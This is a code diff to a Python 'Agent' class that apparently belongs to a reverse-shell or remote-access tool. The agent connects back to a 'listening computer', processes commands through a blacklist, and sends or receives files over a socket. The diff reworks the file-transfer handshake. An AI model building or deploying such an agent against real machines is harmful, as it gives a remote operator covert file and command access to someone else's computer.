@@ -60,10 +60,12 @@ class Agent:
         dataLen = len(data)
 
         self.localSocket.send(str(dataLen).encode())
+        confirmMsg = self.localSocket.recv(2)
+        
         self.localSocket.sendall(data)
-
-        completeMsg = self.localSocket.recv(self.bufferSize)
-        if (completeMsg): file.close()
+        completeMsg = self.localSocket.recv(2)
+        
+        file.close()
     # END OF sendFile METHOD
 
     # RECEIVE FILE =====
@@ -76,26 +78,25 @@ class Agent:
             elif (self.operatingSys == "Unix")   : destination = filePath.split("/")[-1]
         elif (len(cmd_list) == 3): destination = cmd_list[-1]
 
-        dataSize  = int(self.agentSocket.recv(self.bufferSize).decode())
+        dataSize = int(self.localSocket.recv(self.bufferSize).decode())
+        self.localSocket.send(b"OK")
+        
         file      = open(destination, "wb")
         fileBytes = b""
-        buffer    = 1000
+        buffer    = 5000000
         
         while (len(fileBytes) < dataSize):
             curBytes    = len(fileBytes)
             remainBytes = dataSize - curBytes
 
-            if   (buffer <= remainBytes): fileBytes += self.agentSocket.recv(buffer)
-            elif (remainBytes < buffer):  fileBytes += self.agentSocket.recv(remainBytes)
+            if   (buffer <= remainBytes): fileBytes += self.localSocket.recv(buffer)
+            elif (remainBytes < buffer):  fileBytes += self.localSocket.recv(remainBytes)
         
         file.write(fileBytes)
         file.close()
-
-        self.agentSocket.send(b"Download completed")
-        print(f"Downloaded {len(fileBytes)} bytes of data")
-        print(f"[+] Agent: File successfully saved to {destination}")
-
-        return
+        self.localSocket.send(b"OK")
+        
+        return f"[+] Agent: Downloaded {len(fileBytes)} bytes of data\n[+] Agent: File successfully saved to {destination}\n"
     # END OF recvFile METHOD
 
     # PROCESS COMMAND =====
@@ -125,7 +126,7 @@ class Agent:
 
             # Receive file and save
             elif (cmdList[0].lower() == "upload") and (1 < len(cmdList)):
-                self.recvFile(cmdList)
+                result = self.recvFile(cmdList)
             
             # Handle blacklist command
             elif (cmd in cmdBlacklist): 
@@ -192,7 +193,7 @@ class Agent:
 
 # BEGINNING OF MAIN =====
 
-agent = Agent("127.0.0.1", 7399)
+agent = Agent("127.0.0.1", 7399) # Change the IP address to the IP address of the listening computer
 agent.execute()
 
 # END OF MAIN
